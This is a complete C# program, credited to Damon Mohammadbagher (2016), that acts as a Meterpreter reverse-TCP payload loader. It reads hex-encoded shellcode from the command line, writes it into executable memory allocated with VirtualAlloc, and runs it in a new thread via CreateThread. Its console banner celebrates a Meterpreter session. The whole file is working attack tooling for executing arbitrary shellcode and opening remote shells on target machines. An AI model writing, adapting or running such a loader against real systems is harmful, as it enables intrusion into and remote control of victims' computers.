using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace NativePayload_SimpleReverse_tcp
{
    class Program
    {      
        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_SimpleReverse_tcp , Published by Damon Mohammadbagher , 2016");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_SimpleReverse_tcp Simple Meterpreter Payload ");
            Console.WriteLine();
           
            string X = args[0];
            string[] XX = X.Split(',');
            byte[] result__payload = new byte[XX.Length];
            for (int i = 0; i < XX.Length; i++)
            {
                result__payload[i] = Convert.ToByte(XX[i], 16);
            }
            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;

            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Bingo Meterpreter session ;)");

            UInt32 funcAddr = VirtualAlloc(0x00000000, (UInt32)result__payload.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(result__payload, 0x00000000, (IntPtr)(funcAddr), result__payload.Length);

            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;

            hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);
            WaitForSingleObject(hThread, 0xffffffff);
            Console.ForegroundColor = ConsoleColor.Gray;
        }

        [DllImport("kernel32")]
        public static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);       
        [DllImport("kernel32")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
}
